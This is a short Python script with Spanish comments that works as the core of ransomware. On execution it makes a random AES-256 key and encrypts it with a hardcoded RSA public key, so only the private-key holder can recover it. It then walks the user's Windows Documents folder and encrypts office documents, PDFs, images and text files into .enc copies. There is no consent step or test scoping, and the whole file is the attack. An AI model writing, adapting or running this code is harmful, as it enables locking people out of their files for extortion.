import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes

# Función para generar una clave AES aleatoria de 256 bits
def generar_clave_aes():
    return get_random_bytes(32)  # 32 bytes = 256 bits

# Función para cifrar la clave AES con RSA utilizando la llave pública proporcionada
def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
    public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
    clave_cifrada = public_key.encrypt(
        clave_aes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(clave_cifrada).decode()

# Función para cifrar archivos con AES
def cifrar_archivo_aes(archivo, clave_aes):
    cipher = AES.new(clave_aes, AES.MODE_CBC)
    iv = cipher.iv
    with open(archivo, 'rb') as f:
        datos = f.read()

    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo + '.enc', 'wb') as f:
        f.write(iv + datos_cifrados)

# Obtener el directorio "Documents" del usuario
user_profile = os.environ['USERPROFILE']
documents_dir = os.path.join(user_profile, 'Documents')

# Extensiones que se desean cifrar
extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']

# Generar clave AES
clave_aes = generar_clave_aes()

# Llave pública proporcionada (en formato PKCS#8)
public_key_pem = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk9c8fM3oEyNAWNylkTei
Xe0U1GTDqgUCrjOCkoweLpnZr9JihFS888GbJiy+V7WqmFGO20tjsnRLFtgKveVa
Lao0GQP2+cHRzDoXRqkb0Ukn1S/YM6u+BQY+5vwWceQxW10pi8nlasOz6Ua9TJaI
vlEElXoh5AZUDrstUbuOPwaKsbMyj8iLnkcjGglMjSm5U6Scllaods3x/6SIuCSe
Ijb8ZPqMzz5rhzkxQvmzl/PTXdchBHKClbQhurqB9oDc97dP46z6QoV+vfBH6ac5
+2eN9SUCa8rtxvifnfaltX8Z8Kj723fTI6ZLZhShjVl/BdV+PHdkeCC/3p58taX0
iQIDAQAB
-----END PUBLIC KEY-----'''

# Cifrar la clave AES con RSA
clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)

# Guardar la clave cifrada en un archivo
with open(os.path.join(documents_dir, 'clave_aes_cifrada.txt'), 'w') as f:
    f.write(clave_aes_cifrada)

# Cifrar los archivos seleccionados
for foldername, subfolders, filenames in os.walk(documents_dir):
    for filename in filenames:
        if any(filename.endswith(ext) for ext in extensions):
            file_path = os.path.join(foldername, filename)
            cifrar_archivo_aes(file_path, clave_aes)  # Cifrar el archivo con AES

print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada como "clave_aes_cifrada.txt".')
